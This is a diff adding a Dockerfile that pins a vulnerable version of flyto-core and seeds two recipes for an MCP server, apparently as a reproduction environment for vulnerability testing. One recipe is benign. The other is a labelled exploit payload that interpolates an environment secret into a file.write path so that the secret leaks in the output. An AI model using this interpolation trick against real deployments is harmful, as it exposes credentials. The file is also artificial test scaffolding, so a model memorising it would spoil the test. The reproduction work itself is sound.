@@ -1,0 +1,35 @@
+# flyto-core 2.26.2 (pre-fix for every counted flaw of the SSRF twin). Real pinned software from PyPI, no stub.
+# Base pinned by digest for cross-machine reproducibility (python:3.12-slim).
+# No COPY/ADD: the fingerprint hashes instructions only, so the benign recipe is inlined by RUN.
+FROM python@sha256:a6e34c598f2467ed0e9a8d349809fcd8b5c603269512df273a0bb1784edc11b1
+RUN pip install --no-cache-dir "flyto-core==2.26.2"
+
+# The seeded recipe the benign run_recipe call runs: one pure string step, no backend.
+RUN recipes="$(python -c 'import cli.recipe as r; print(r.RECIPES_DIR)')" \
+ && printf '%s\n' \
+  'name: nb08benign' \
+  'description: benign recipe' \
+  'steps:' \
+  '  - id: u' \
+  '    module: string.uppercase' \
+  '    params:' \
+  '      text: "hello"' \
+  > "$recipes/nb08benign.yaml"
+
+# The seeded recipe the CVE-2026-67427 exploit runs: it interpolates ${env.FLYTO_LEAKME} into a
+# file.write path, surfacing the out-of-scope env secret in run_recipe's output_files.
+RUN recipes="$(python -c 'import cli.recipe as r; print(r.RECIPES_DIR)')" \
+ && printf '%s\n' \
+  'name: nb08leak2' \
+  'description: env interpolation probe' \
+  'steps:' \
+  '  - id: w' \
+  '    module: file.write' \
+  '    params:' \
+  '      path: "/tmp/${env.FLYTO_LEAKME}.txt"' \
+  '      content: "probe"' \
+  > "$recipes/nb08leak2.yaml"
+
+ENV FLYTO_ALLOWED_HOSTS=localhost
+ENV FLYTO_SANDBOX_DIR=/tmp
+ENTRYPOINT ["python", "-m", "core.mcp_server"]
